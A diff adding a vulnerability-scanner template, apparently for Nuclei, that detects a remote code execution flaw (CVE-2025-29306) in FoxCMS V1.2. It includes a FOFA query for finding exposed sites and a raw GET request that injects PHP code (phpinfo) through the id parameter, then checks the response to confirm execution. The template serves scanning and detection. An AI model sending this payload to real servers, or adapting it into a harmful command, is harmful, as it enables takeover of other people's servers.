@@ -1,0 +1,29 @@
+id: foxcms-index-rce
+info:
+  name: FOXCMS 黔狐内容管理系统服务 - rce
+  author: leadlife
+  severity: critical
+  description: FoxCMS是一套可免费商用且开源的网站管理系统,采用PHP+MySQL架构。 FOXCMS黔狐内容管理系统存在服务参数注入漏洞，攻击者可利用该漏洞获取服务器控制权。
+  reference: 
+    - https://github.com/somatrasss/CVE-2025-29306
+    - https://github.com/lal0ne/vulnerability/blob/ce56e61da2aac4bdbaf44929f68c7079d6f5c944/FoxCMS/CVE-2025-29306/README.md
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: icon_hash="643998059"
+    version: FOXCMS黔狐内容管理系统 V1.2
+  tags: foxcms,rce
+
+http:
+  - raw:
+      - |
+        GET /images/index.html?id=%24{%40print(phpinfo())} HTTP/1.1
+        Host: {{Hostname}} 
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body,'PHP Version')
+        condition: and
